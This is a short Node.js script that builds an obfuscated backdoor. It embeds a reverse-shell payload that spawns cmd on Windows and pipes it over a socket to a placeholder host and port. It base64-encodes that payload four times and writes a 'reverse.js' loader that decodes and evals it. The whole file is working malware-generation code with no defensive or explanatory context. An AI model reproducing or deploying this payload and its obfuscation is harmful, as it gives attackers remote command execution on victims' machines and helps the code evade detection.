const fs = require('fs')

const PORT = '__PORT'
const HOST = '__HOST'

const reverseConnectionString = `
;(function () {
    var net = require('net'),
      cp = require('child_process'),
      sh = cp.spawn('cmd', [])
    var client = new net.Socket()
    client.connect('${PORT}', '${HOST}', function () {
      client.pipe(sh.stdin)
      sh.stdout.pipe(client)
      sh.stderr.pipe(client)
    })
    return /a/
  })()
`

const revFile = (encodedFile, manyTimes) => `
let decodedFile = '${encodedFile}'
;[...Array(${manyTimes})].forEach((_, i) => {
    decodedFile = Buffer.from(decodedFile, 'base64').toString('utf-8')
})

eval(decodedFile)
`

const encodeFile = (manyTimes) => {
  let encodedFile = reverseConnectionString
  ;[...Array(manyTimes)].forEach((_, i) => {
    encodedFile = Buffer.from(encodedFile, 'utf-8').toString('base64')
  })

  return encodedFile
}

const decodeFile = (encodedFile, manyTimes) => {
  let decodedFile = encodedFile
  ;[...Array(manyTimes)].forEach((_, i) => {
    decodedFile = Buffer.from(decodedFile, 'base64').toString('utf-8')
  })

  return decodedFile
}

const main = async () => {
  const manyTimes = 4
  const encodedBackdoor = encodeFile(manyTimes)

  await fs.writeFileSync('reverse.js', revFile(encodedBackdoor, manyTimes), 'utf-8')
}

main()
